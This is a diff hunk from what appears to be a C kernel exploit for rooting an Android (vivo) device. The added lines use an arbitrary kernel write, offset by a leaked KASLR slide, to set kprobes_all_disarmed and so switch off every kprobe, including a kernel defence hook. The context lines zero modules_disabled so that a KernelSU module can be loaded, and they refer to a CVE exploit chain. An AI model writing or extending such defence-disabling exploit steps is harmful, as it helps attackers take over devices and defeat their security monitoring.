@@ -3315,6 +3315,11 @@ int main(int argc, char **argv)
 
         if (!g_slide)
             park_forever("no KASLR slide");
+        /* 直接写 kprobes_all_disarmed 为非零值（fake 模式写 node 地址），
+         * 一次性 disarm 所有 kprobe（含 hooks_defend），绕过 HKD 的 .data 依赖 */
+        if (KPROBES_DISARM_STATIC &&
+            stage_write(KPROBES_DISARM_STATIC + g_slide, 2, "kprobes_disarm", raw, NULL))
+            park_forever("kprobes disarm failed");
         /* vivo: zero modules_disabled so the rooted child's ksud can
          * late-load kernelsu.ko (finit_module). Same proven-first ordering
          * as the CVE-2026-64560 chain on this device.  Best-effort read
